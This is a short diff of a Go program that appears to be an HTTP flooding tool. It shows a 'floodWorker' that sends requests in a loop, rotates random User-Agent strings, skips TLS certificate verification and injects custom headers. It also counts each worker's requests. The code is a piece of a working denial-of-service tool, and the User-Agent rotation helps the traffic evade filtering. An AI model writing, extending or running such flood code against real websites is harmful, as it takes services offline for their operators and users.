@@ -4,14 +4,12 @@ import (
 	"bytes"
 	"crypto/tls"
 	"net/http"
-	"net/url"
 )
 
 type floodWorker struct {
 	dead           bool
 	exitChan       chan int
 	id             int
-	target         url.URL
 	RequestCounter int
 }
 
@@ -19,7 +17,7 @@ func (fw *floodWorker) Start() {
 	go func() {
 		defer fw.Kill()
 		client := &http.Client{}
-		if fw.target.Scheme == "https" {
+		if scheme == "https" {
 			//Skip certificate verify for performance
 			secureTransport := &http.Transport{
 				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -32,14 +30,14 @@ func (fw *floodWorker) Start() {
 				return
 			}
 
-			//Client logic inside loop for future dynamic tokens implementation
 			body := []byte(tokenizedBody.String())
 			req, _ := http.NewRequest(*method, tokenizedTarget.String(), bytes.NewBuffer(body))
 			req.Header.Set("User-Agent", getRandomUserAgent())
 			if *method == "POST" {
 				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 			}
-
+			//Inject custom headers right before sending
+			injectHeaders(req)
 			client.Do(req)
 			fw.RequestCounter += 1 //Worker specific counter
 			requestChan <- true
